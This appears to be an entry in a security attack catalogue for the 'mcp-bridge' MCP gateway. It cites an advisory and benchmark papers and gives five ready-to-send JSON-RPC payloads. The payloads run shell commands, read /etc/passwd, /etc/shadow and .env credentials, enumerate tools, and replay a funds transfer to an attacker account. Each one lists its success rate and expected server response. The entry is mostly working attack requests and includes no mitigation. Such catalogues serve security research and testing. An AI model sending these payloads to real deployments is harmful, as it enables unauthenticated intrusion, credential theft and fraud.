# mcp-bridge

## mcp-bridge

- **Install:** `npm install -g mcp-bridge && npx -y mcp-bridge --port 3002`
- **Benchmarks/Papers that attacked it:**
  - GHSA-wvr4-3wq4-gpc5 — unauthenticated RCE via `/bridge` HTTP endpoint
  - MCPSecBench (arXiv:2508.13220) — protocol-level attacks, unauthenticated access
  - MCP-AttackBench (arXiv:2508.10991) — auth bypass and unauthenticated RCE patterns

---

### Attack: Unauthenticated RCE via /bridge Endpoint (GHSA-wvr4-3wq4-gpc5)

- **Category:** Unauthenticated remote code execution (CWE-306)
- **Source:** GHSA-wvr4-3wq4-gpc5
- **ASR:** 100% on unprotected deployments
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "execute_command",
    "arguments": {
      "command": "id && whoami && cat /etc/passwd"
    }
  }
}
```
- **What it does:** Sends an unauthenticated JSON-RPC request to `http://localhost:3002/bridge`. The mcp-bridge HTTP endpoint accepts any tool invocation from any network source without authentication, allowing arbitrary command execution via any connected MCP server's tools.
- **Expected server response:** Returns output of `id`, `whoami`, and `/etc/passwd` — full server compromise with no credentials required.

---

### Attack: Network-Wide Exposure — Bind-All Interface Attack

- **Category:** Unauthenticated access via network-wide bind (CWE-306)
- **Source:** GHSA-wvr4-3wq4-gpc5; MCPSecBench
- **ASR:** 100% on default configurations
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {
      "path": "/etc/shadow"
    }
  }
}
```
- **What it does:** Exploits mcp-bridge's default behavior of binding to `0.0.0.0` (all interfaces), making the MCP endpoint accessible from any machine on the network. Any network host can now call privileged MCP tools without authentication.
- **Expected server response:** Returns `/etc/shadow` contents if the filesystem MCP server is connected and running as root.

---

### Attack: Tool Enumeration via Unauthenticated tools/list

- **Category:** Reconnaissance / tool enumeration (CWE-200)
- **Source:** GHSA-wvr4-3wq4-gpc5; MCPSecBench
- **ASR:** 100%
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/list",
  "params": {}
}
```
- **What it does:** Enumerates all available MCP tools through the unauthenticated bridge endpoint, mapping the complete attack surface before launching targeted attacks.
- **Expected server response:** Returns full list of all tools available across all MCP servers connected to the bridge.

---

### Attack: Replay Attack via Stateless Bridge

- **Category:** Replay attack (CWE-294)
- **Source:** MCIP-Bench (Replay Injection, 9.9% of test cases); MCPSecBench
- **ASR:** 9.9%
- **Full JSON-RPC payload (replayed):**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "transfer_funds",
    "arguments": {
      "amount": 1000,
      "destination": "attacker_account",
      "currency": "USD"
    }
  }
}
```
- **What it does:** Replays a captured tool invocation through the bridge's stateless HTTP endpoint. Because mcp-bridge does not implement nonce validation or idempotency guards, each replay triggers a duplicate server-side action.
- **Expected server response:** `success: true` for each replay — server executes the action multiple times without detecting the duplicate.

---

### Attack: Cross-Server Tool Injection via Bridge

- **Category:** Privilege escalation via tool chaining (CWE-250)
- **Source:** MCP Server Database (arXiv:2509.06572) — 90% success rate on parasitic toolchain attacks
- **ASR:** 90% (parasitic toolchain attacks, Zhao et al.)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {
      "path": "/app/.env"
    }
  }
}
```
- **What it does:** Uses the bridge to call the filesystem server's `read_file` tool from outside the intended trust boundary. The bridge aggregates multiple MCP servers, so a caller can mix tools from different servers in one session to construct parasitic toolchain attacks.
- **Expected server response:** Returns `.env` credentials; these can then be used in the same session to call other servers' privileged tools.
